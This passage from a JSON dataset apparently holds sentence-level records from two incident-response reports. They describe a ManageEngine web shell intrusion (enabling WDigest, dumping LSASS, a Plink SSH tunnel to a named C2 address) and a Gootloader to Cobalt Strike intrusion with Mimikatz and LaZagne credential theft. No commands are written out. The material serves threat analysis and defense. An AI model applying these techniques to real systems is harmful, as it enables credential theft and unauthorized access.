        "id": "dfir-reports-filtered/r-dfir-13.md:::S56",
        "text": "On the beachhead system, the threat actor queried the registry checking to see if WDigest was enabled:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 56,
        "index": 5099
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S57",
        "text": "WDigest allows for credential caching in LSASS which will result in a users plaintext password being stored in memory.",
        "type": "",
        "report": "r-dfir-13",
        "line": 57,
        "index": 5100
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S58",
        "text": "The intended purpose of WDigest credential caching is to facilitate clear text authentication with HTTP and SASL, however, this can be misused by the threat actor to retrieve the plaintext credentials of a user.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 58,
        "index": 5101
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S59",
        "text": "Here\u2019s the command executed from the web shell:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 59,
        "index": 5102
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S60",
        "text": "This registry value was not present on the system, which informed the attacker that WDigest was disabled on the beachhead.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 60,
        "index": 5103
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S61",
        "text": "Twenty-two seconds later, the threat actor enabled WDigest using the following command, via the web shell:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 61,
        "index": 5104
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S62",
        "text": "After enabling WDigest, the attacker checked back numerous times over multiple days to see who was signed in.",
        "type": "",
        "report": "r-dfir-13",
        "line": 62,
        "index": 5105
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S63",
        "text": "During this period, a privileged user logged onto the system for maintenance work and after which, the threat actor dumped LSASS using comsvcs.dll.",
        "type": "",
        "report": "r-dfir-13",
        "line": 63,
        "index": 5106
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S64",
        "text": "The threat actor listed the running processes via the tasklist command and used the PID of LSASS from the output to pass to the credential dumping command.",
        "type": "",
        "report": "r-dfir-13",
        "line": 64,
        "index": 5107
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S65",
        "text": "The LSASS dump was then exfiltrated out of the environment for offline analysis and rest of the actions were conducted from the account whose password was extracted from the LSASS dump.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 65,
        "index": 5108
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S66",
        "text": "The threat actor used the web shell fm2.jsp to conduct their initial discovery on the host.",
        "type": "",
        "report": "r-dfir-13",
        "line": 66,
        "index": 5109
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S67",
        "text": "Below are the GET requests sent to the web shell with the discovery commands passed to the cmd parameter, which runs as PowerShell.",
        "type": "",
        "report": "r-dfir-13",
        "line": 67,
        "index": 5110
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S68",
        "text": "They also used the web shell to review directories, here\u2019s a few examples\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 68,
        "index": 5111
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S69",
        "text": "The threat actor used the web shell to download file.exe onto the beachhead and save it as ekern.exe using a PowerShell download cradle.",
        "type": "",
        "report": "r-dfir-13",
        "line": 69,
        "index": 5112
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S70",
        "text": "The file ekern.exe was a renamed copy of Plink.exe, a command-line SSH client.",
        "type": "",
        "report": "r-dfir-13",
        "line": 70,
        "index": 5113
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S71",
        "text": "Plink was used in conjunction with a batch script named FXS.bat to establish an SSH connection with the threat actor\u2019s server.",
        "type": "",
        "report": "r-dfir-13",
        "line": 71,
        "index": 5114
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S72",
        "text": "Let\u2019s break down what this command means:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 72,
        "index": 5115
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S73",
        "text": "Providing \u201cy\u201d as standard input to the executable.",
        "type": "",
        "report": "r-dfir-13",
        "line": 73,
        "index": 5116
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S74",
        "text": "To confirm when plink asks if they would like the public key added to known hosts.",
        "type": "",
        "report": "r-dfir-13",
        "line": 74,
        "index": 5117
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S75",
        "text": "Plink executable\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 75,
        "index": 5118
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S76",
        "text": "Force the use of SSH (Plink can support other protocols)\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 76,
        "index": 5119
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S77",
        "text": "Define a specific target port for SSH connection\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 77,
        "index": 5120
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S78",
        "text": "Connect with the specified username\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 78,
        "index": 5121
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S79",
        "text": "Password to authenticate with\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 79,
        "index": 5122
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S80",
        "text": "Listen on 23.81.246.84:49800 and forward it to 127.0.0.1:3389.",
        "type": "",
        "report": "r-dfir-13",
        "line": 80,
        "index": 5123
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S81",
        "text": "This effectively proxies the request to the host running the command\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 81,
        "index": 5124
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S82",
        "text": "Target server to SSH\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 82,
        "index": 5125
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S83",
        "text": "The actor defined a custom target port to Plink (-P 443) instead of the default SSH port of 22.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 83,
        "index": 5126
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S84",
        "text": "The actor used the technique of port forwarding to listen on the remote port, 23.81.246[.]84:49800, and forward the requests to 127.0.0.1:3389.",
        "type": "",
        "report": "r-dfir-13",
        "line": 84,
        "index": 5127
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S85",
        "text": "This resulted in the actor being able to RDP to the beachhead server via the SSH tunnel.",
        "type": "",
        "report": "r-dfir-13",
        "line": 85,
        "index": 5128
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S86",
        "text": "The script FXS.bat was re-",
        "type": "",
        "report": "r-dfir-13",
        "line": 86,
        "index": 5129
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S87",
        "text": "used multiple times to establish connections to various hosts.",
        "type": "",
        "report": "r-dfir-13",
        "line": 87,
        "index": 5130
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S88",
        "text": "The actor then replaced the loopback address with various internal hosts.",
        "type": "",
        "report": "r-dfir-13",
        "line": 88,
        "index": 5131
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S89",
        "text": "The ManageEngine server acted as a proxy that forwarded the RDP traffic between the target host and the threat actor\u2019s server:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 89,
        "index": 5132
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S90",
        "text": "All command and control traffic we observed was through the SSH tunnel to 23.81.246.84.",
        "type": "",
        "report": "r-dfir-13",
        "line": 90,
        "index": 5133
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S91",
        "text": "That IP address was exposing an SSH server on port 443 which was what the beachhead made connections with.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 91,
        "index": 5134
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S92",
        "text": "The headers of 23.81.246.84:433 reported the threat actor was using a Bitvise SSH Server:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 92,
        "index": 5135
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S93",
        "text": "After getting a foothold on the beachhead machine, an attacker first downloaded the postgres DB backup of the ManageEngine SupportCenter Plus application using the web shell.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 93,
        "index": 5136
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S94",
        "text": "Seven days after initial access, an attacker exfiltrated a certificate from the server, a Visio file, and an excel sheet for the accounts via web shell:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 94,
        "index": 5137
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S95",
        "text": "Server certificate downloaded via web shell:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 95,
        "index": 5138
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S96",
        "text": "Visio file downloaded via web shell:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 96,
        "index": 5139
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S97",
        "text": "Excel file downloaded via web shell:\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 97,
        "index": 5140
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S98",
        "text": "An attacker was also seen exfiltrating confidential documents during a RDP session and triggering canary tokens from 192.221.154.141 and 8.0.26.137 upon opening the documents.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 98,
        "index": 5141
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S99",
        "text": "Impact\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 99,
        "index": 5142
    },
    {
        "id": "dfir-reports-filtered/r-dfir-13.md:::S100",
        "text": "The threat actors were evicted from the network soon after stealing confidential information.\n",
        "type": "",
        "report": "r-dfir-13",
        "line": 100,
        "index": 5143
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S0",
        "text": "The intrusion started with a user searching Bing for \u201cOlymplus Plea Agreement?\u201d.",
        "type": "",
        "report": "r-dfir-14",
        "line": 0,
        "index": 5144
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S1",
        "text": "The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section).",
        "type": "",
        "report": "r-dfir-14",
        "line": 1,
        "index": 5145
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S2",
        "text": "Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.",
        "type": "",
        "report": "r-dfir-14",
        "line": 2,
        "index": 5146
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S3",
        "text": "Fifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network.",
        "type": "",
        "report": "r-dfir-14",
        "line": 3,
        "index": 5147
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S4",
        "text": "The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.",
        "type": "",
        "report": "r-dfir-14",
        "line": 4,
        "index": 5148
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S5",
        "text": "After pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server.",
        "type": "",
        "report": "r-dfir-14",
        "line": 5,
        "index": 5149
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S6",
        "text": "Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation.",
        "type": "",
        "report": "r-dfir-14",
        "line": 6,
        "index": 5150
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S7",
        "text": "Meanwhile on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.",
        "type": "",
        "report": "r-dfir-14",
        "line": 7,
        "index": 5151
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S8",
        "text": "With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host.",
        "type": "",
        "report": "r-dfir-14",
        "line": 8,
        "index": 5152
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S9",
        "text": "They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 9,
        "index": 5153
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S10",
        "text": "The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion.",
        "type": "",
        "report": "r-dfir-14",
        "line": 10,
        "index": 5154
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S11",
        "text": "After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 11,
        "index": 5155
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S12",
        "text": "The threat actors then used Lazagne again on the domain controller to extract more credentials.",
        "type": "",
        "report": "r-dfir-14",
        "line": 12,
        "index": 5156
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S13",
        "text": "Our evidence shows that the attackers then began looking for interesting documents on file shares.",
        "type": "",
        "report": "r-dfir-14",
        "line": 13,
        "index": 5157
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S14",
        "text": "They opened the documents one-by-one on the remote host via RDP.",
        "type": "",
        "report": "r-dfir-14",
        "line": 14,
        "index": 5158
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S15",
        "text": "They directed their focus to documents with legal and insurance-related content.",
        "type": "",
        "report": "r-dfir-14",
        "line": 15,
        "index": 5159
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S16",
        "text": "On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session.",
        "type": "",
        "report": "r-dfir-14",
        "line": 16,
        "index": 5160
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S17",
        "text": "Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 17,
        "index": 5161
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S18",
        "text": "The threat actor gained initial access using Gootloader malware.",
        "type": "",
        "report": "r-dfir-14",
        "line": 18,
        "index": 5162
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S19",
        "text": "Here\u2019s a video of the user searching and downloading the malware via the poisoned SEO search.",
        "type": "",
        "report": "r-dfir-14",
        "line": 19,
        "index": 5163
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S20",
        "text": "The Javascript file is then executed when double clicked after the zip is opened.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 20,
        "index": 5164
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S21",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 21,
        "index": 5165
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S22",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 22,
        "index": 5166
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S23",
        "text": "Gootloader upon execution creates two registry keys:\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 23,
        "index": 5167
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S24",
        "text": "The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named powershell.dll.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 24,
        "index": 5168
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S25",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 25,
        "index": 5169
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S26",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 26,
        "index": 5170
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S27",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 27,
        "index": 5171
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S28",
        "text": "Following the Registry events, a PowerShell command was launched executing an encoded command.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 28,
        "index": 5172
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S29",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 29,
        "index": 5173
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S30",
        "text": "The PowerShell command will extract the .NET loader from HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username0 and execute the code in memory via `Assembly.Load()`.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 30,
        "index": 5174
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S31",
        "text": "This CyberChef recipe can be used to decode the related PS encoded payload.",
        "type": "",
        "report": "r-dfir-14",
        "line": 31,
        "index": 5175
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S32",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 32,
        "index": 5176
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S33",
        "text": "Once the PowerShell script is finished running, the next stage involves the .NET loader.",
        "type": "",
        "report": "r-dfir-14",
        "line": 33,
        "index": 5177
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S34",
        "text": "The .NET loader will read HKCU:\\SOFTWARE\\Microsoft\\Phone\\Username and extract the encoded Cobalt Strike payload.",
        "type": "",
        "report": "r-dfir-14",
        "line": 34,
        "index": 5178
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S35",
        "text": "This payload will be decoded and subsequently loaded into memory for execution.",
        "type": "",
        "report": "r-dfir-14",
        "line": 35,
        "index": 5179
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S36",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 36,
        "index": 5180
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S37",
        "text": "A simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 37,
        "index": 5181
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S38",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 38,
        "index": 5182
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S39",
        "text": "The following shows the source code responsible for the core logic of the .NET loader.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 39,
        "index": 5183
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S40",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 40,
        "index": 5184
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S41",
        "text": "The below diagram summarizes the Gootloader initial execution. \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 41,
        "index": 5185
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S42",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 42,
        "index": 5186
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S43",
        "text": "An excellent resource from Microsoft describes a set of configurations that can be applied to Windows that can stop .js files from executing, preventing this attack chain from ever getting off the ground.",
        "type": "",
        "report": "r-dfir-14",
        "line": 43,
        "index": 5187
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S44",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 44,
        "index": 5188
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S45",
        "text": "During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 45,
        "index": 5189
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S46",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 46,
        "index": 5190
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S47",
        "text": "The Javascript (Gootloader) file invoked an encoded PowerShell command.",
        "type": "",
        "report": "r-dfir-14",
        "line": 47,
        "index": 5191
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S48",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 48,
        "index": 5192
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S49",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 49,
        "index": 5193
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S50",
        "text": "The task created from the PowerShell script:\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 50,
        "index": 5194
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S51",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 51,
        "index": 5195
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S52",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 52,
        "index": 5196
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S53",
        "text": "Windows Defender scheduled scans were deleted from the system.",
        "type": "",
        "report": "r-dfir-14",
        "line": 53,
        "index": 5197
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S54",
        "text": "This was observed on multiple servers the threat actor pivoted to.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 54,
        "index": 5198
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S55",
        "text": "Furthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 55,
        "index": 5199
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S56",
        "text": "As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.",
        "type": "",
        "report": "r-dfir-14",
        "line": 56,
        "index": 5200
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S57",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 57,
        "index": 5201
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S58",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 58,
        "index": 5202
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S59",
        "text": "This can be observed in the memory dump from the beachhead host with the tell-tale PAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers observable in the process memory space.",
        "type": "",
        "report": "r-dfir-14",
        "line": 59,
        "index": 5203
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S60",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 60,
        "index": 5204
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S61",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 61,
        "index": 5205
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S62",
        "text": "During the intrusion we observed various named pipes utilized by the threat actor\u2019s Cobalt Strike beacons including default Cobalt Strike named pipes.",
        "type": "",
        "report": "r-dfir-14",
        "line": 62,
        "index": 5206
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S63",
        "text": "The threat actors were observed making use of double encoded Powershell commands.",
        "type": "",
        "report": "r-dfir-14",
        "line": 63,
        "index": 5207
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S64",
        "text": "The first layer of encoding contains Hexadecimal and XOR encoding.",
        "type": "",
        "report": "r-dfir-14",
        "line": 64,
        "index": 5208
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S65",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 65,
        "index": 5209
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S66",
        "text": "The second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.",
        "type": "",
        "report": "r-dfir-14",
        "line": 66,
        "index": 5210
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S67",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 67,
        "index": 5211
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S68",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 68,
        "index": 5212
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S69",
        "text": "Decoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.",
        "type": "",
        "report": "r-dfir-14",
        "line": 69,
        "index": 5213
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S70",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 70,
        "index": 5214
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S71",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 71,
        "index": 5215
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S72",
        "text": "The malicious PowerShell process used by Gootloader dropped a PowerShell script named \u201cmi.ps1\u201d on the file system.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 72,
        "index": 5216
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S73",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 73,
        "index": 5217
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S74",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 74,
        "index": 5218
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S75",
        "text": "Another PowerShell command was used to trigger the mi.ps1 script.",
        "type": "",
        "report": "r-dfir-14",
        "line": 75,
        "index": 5219
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S76",
        "text": "The script was using XOR-encoding.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 76,
        "index": 5220
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S77",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 77,
        "index": 5221
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S78",
        "text": "This CyberChef recipe can be used to decode the inner encoded command.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 78,
        "index": 5222
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S79",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 79,
        "index": 5223
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S80",
        "text": "The output lists \u201cInvoke-Mimikatz\u201d, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.",
        "type": "",
        "report": "r-dfir-14",
        "line": 80,
        "index": 5224
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S81",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 81,
        "index": 5225
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S82",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 82,
        "index": 5226
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S83",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 83,
        "index": 5227
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S84",
        "text": "In addition, the post-exploitation tool \u201cLaZagne\u201d (renamed to ls.exe) was used with the \u201c-all\u201d switch.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 84,
        "index": 5228
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S85",
        "text": "This will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the \u201cC:\\Users\u201d directory.",
        "type": "",
        "report": "r-dfir-14",
        "line": 85,
        "index": 5229
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S86",
        "text": "When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.",
        "type": "",
        "report": "r-dfir-14",
        "line": 86,
        "index": 5230
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S87",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 87,
        "index": 5231
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S88",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 88,
        "index": 5232
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S89",
        "text": "Here\u2019s the commands from another system:\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 89,
        "index": 5233
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S90",
        "text": "The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain.",
        "type": "",
        "report": "r-dfir-14",
        "line": 90,
        "index": 5234
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S91",
        "text": "The Cobalt Strike beacon was used to invoke the PowerShell script.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 91,
        "index": 5235
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S92",
        "text": " \n",
        "type": "",
        "report": "r-dfir-14",
        "line": 92,
        "index": 5236
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S93",
        "text": "They also ran a WMI command on the beachhead host and one other host to check for AntiVirus.\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 93,
        "index": 5237
    },
    {
        "id": "dfir-reports-filtered/r-dfir-14.md:::S94",
        "text": "The threat actors executed this command remotely on a domain controller, before moving laterally to it:\n",
        "type": "",
        "report": "r-dfir-14",
        "line": 94,
        "index": 5238
    },
    {
